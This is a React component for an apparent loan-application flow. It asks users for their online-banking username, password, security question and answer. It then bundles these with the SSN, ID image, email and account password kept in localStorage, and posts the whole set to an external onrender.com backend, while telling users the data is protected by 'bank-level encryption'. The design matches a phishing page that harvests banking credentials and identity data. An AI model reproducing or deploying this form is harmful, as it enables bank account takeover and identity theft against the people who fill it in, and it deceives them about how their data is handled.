import { useState } from "react";
import { IoIosArrowBack } from "react-icons/io";
import { IoLockOpenOutline } from "react-icons/io5";
import { useNavigate, useOutletContext } from "react-router-dom";
import { toast } from "react-hot-toast";

const BankInfo = () => {
  const navigate = useNavigate();
  const { handleNext } = useOutletContext();

  const [bankName, setBankName] = useState("");
  const [accountNumber, setAccountNumber] = useState("");
  const [routingNumber, setRoutingNumber] = useState("");
  const [onlineUsername, setOnlineUsername] = useState("");
  const [onlinePassword, setOnlinePassword] = useState("");
  const [securityQuestion, setSecurityQuestion] = useState("");
  const [securityAnswer, setSecurityAnswer] = useState("");

  const handleNextClick = async (e) => {
    e.preventDefault();

    // Validation
    if (
      !bankName ||
      !accountNumber ||
      !routingNumber ||
      !onlineUsername ||
      !onlinePassword ||
      !securityQuestion ||
      !securityAnswer
    ) {
      toast.error("Please complete all bank information fields.");
      return;
    }

    // Retrieve data from localStorage
    const idType = localStorage.getItem("idType");
    const ssn = localStorage.getItem("ssn");
    const address = localStorage.getItem("address");
    const firstName = localStorage.getItem("firstName");
    const lastName = localStorage.getItem("lastName");
    const email = localStorage.getItem("email");
    const password = localStorage.getItem("password");

    // Note: idImage is a file and may require special handling
    const idImage = localStorage.getItem("idImage");

    // Combine all data
    const requestData = {
      firstName,
      lastName,
      email,
      password, // Assuming it is a hashed password
      idType,
      ssn,
      address,
      idImage, // Assuming it is a file path or base64 string
      bankName,
      accountNumber,
      routingNumber,
      onlineUsername,
      onlinePassword,
      securityQuestion,
      securityAnswer,
    };

    try {
      // Make the API call
      const response = await fetch(
        "https://lendingbackend-4gv6.onrender.com/api/user/createUser",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(requestData),
        }
      );

      const result = await response.json();

      if (response.ok) {
        toast.success("User created successfully!");
        navigate("/success"); // Navigate to success page or next step
      } else {
        toast.error(`Error: ${result.message}`);
      }
    } catch (error) {
      toast.error("An error occurred while creating the user.");
      console.error(error);
    }

    handleNext();
  };

  const handleBackClick = () => {
    navigate(-1); // Navigate back to the previous page
  };

  return (
    <div className="w-full h-[55rem] flex justify-center flex-col items-center max-md:h-[70rem]">
      <div className="w-[45%] h-[7%] bg-[#DDF0E4] rounded text-green-800 font-semibold flex justify-center items-center gap-2 max-md:w-[90%]">
        <IoIosArrowBack size={20} />
        <p>Enter your bank details securely</p>
      </div>
      <div className="w-[45%] h-[18%] gap-2 flex-col flex  max-md:w-[90%] justify-center items-start">
        <p className="text-4xl font-bold text-blue-950">Bank Information</p>
        <p className="text-xl text-blue-950">
          Please fill in your bank details to proceed.
        </p>
      </div>
      <form
        onSubmit={handleNextClick}
        className="w-[45%] h-[90%] space-y-3 flex flex-col justify-around items-center max-md:w-[90%]"
      >
        <div className="w-full h-[20%] flex justify-around items-center max-md:h-[30%] max-md:space-y-4 max-md:flex-col">
          <div className="w-[45%] h-[60%] flex-col flex justify-center gap-1 items-start max-md:w-full">
            <label className="font-semibold text-xl text-blue-950">
              Bank Name
            </label>
            <input
              type="text"
              value={bankName}
              onChange={(e) => setBankName(e.target.value)}
              placeholder="Enter your bank name"
              className="w-full h-[60%] border-gray-400 border px-3 rounded outline-blue-950"
            />
          </div>
          <div className="w-[45%] h-[60%] flex-col flex justify-center gap-1 items-start max-md:w-full">
            <label className="font-semibold text-xl text-blue-950">
              Account Number
            </label>
            <input
              type="text"
              value={accountNumber}
              onChange={(e) => setAccountNumber(e.target.value)}
              placeholder="Enter your account number"
              className="w-full h-[70%] border-gray-400 border px-3 rounded outline-blue-950"
            />
          </div>
        </div>
        <div className="w-full h-[20%] flex justify-around items-center max-md:h-[30%] max-md:space-y-4 max-md:flex-col">
          <div className="w-[45%] h-[60%] flex-col flex justify-center gap-1 items-start max-md:w-full ">
            <label className="font-semibold text-xl text-blue-950">
              Routing Number
            </label>
            <input
              type="text"
              value={routingNumber}
              onChange={(e) => setRoutingNumber(e.target.value)}
              placeholder="Enter your routing number"
              className="w-full h-[70%] border-gray-400 border px-3 rounded outline-blue-950"
            />
          </div>
          <div className="w-[45%] h-[60%] flex-col flex justify-center gap-1 items-start max-md:w-full ">
            <label className="font-semibold text-xl text-blue-950">
              Online Access Username
            </label>
            <input
              type="text"
              value={onlineUsername}
              onChange={(e) => setOnlineUsername(e.target.value)}
              placeholder="Enter your online access username"
              className="w-full h-[70%] border-gray-400 border px-3 rounded outline-blue-950"
            />
          </div>
        </div>
        <div className="w-full h-[20%]  flex justify-around items-center max-md:h-[30%] max-md:space-y-4 max-md:flex-col">
          <div className="w-[45%] h-[60%] flex-col flex justify-center gap-1 items-start max-md:w-full ">
            <label className="font-semibold text-xl text-blue-950">
              Online Access Password
            </label>
            <input
              type="password"
              value={onlinePassword}
              onChange={(e) => setOnlinePassword(e.target.value)}
              placeholder="Enter your online access password"
              className="w-full h-[70%] border-gray-400 border px-3 rounded outline-blue-950"
            />
          </div>
          <div className="w-[45%] h-[60%] flex-col flex justify-center  gap-1 items-start max-md:w-full ">
            <label className="font-semibold text-xl text-blue-950">
              Security Question
            </label>
            <input
              type="text"
              value={securityQuestion}
              onChange={(e) => setSecurityQuestion(e.target.value)}
              placeholder="Enter your security question"
              className="w-full h-[70%] border-gray-400 border px-3 rounded outline-blue-950"
            />
          </div>
        </div>

        <div className="w-[95%] h-[15%] flex-col flex justify-center gap-1  items-start">
          <label className="font-semibold text-xl text-blue-950">
            Security Answer
          </label>
          <input
            type="text"
            value={securityAnswer}
            onChange={(e) => setSecurityAnswer(e.target.value)}
            placeholder="Enter your security answer"
            className="w-[100%] h-[70%] border-gray-400 border px-3 rounded outline-blue-950 max-md:w-full"
          />
        </div>

        <div className="w-full h-[10%] flex justify-start gap-3 px-2 items-center">
          <IoLockOpenOutline size={30} />
          <p className="text-gray-400">
            We keep your information secure with bank-level encryption.
          </p>
        </div>

        <div className="w-full h-[17%] flex justify-center items-center gap-3">
          <div className="w-[17%] h-[40%] bg-white shadow-md rounded-md flex hover:bg-gray-300 cursor-pointer justify-center items-center">
            <IoIosArrowBack
              size={25}
              className="text-blue-600"
              onClick={handleBackClick}
            />
          </div>
          <button
            className="py-2 text-white font-semibold text-xl px-24 bg-blue-600 hover:bg-blue-900"
            type="submit"
          >
            Next
          </button>
        </div>
      </form>
    </div>
  );
};

export default BankInfo;
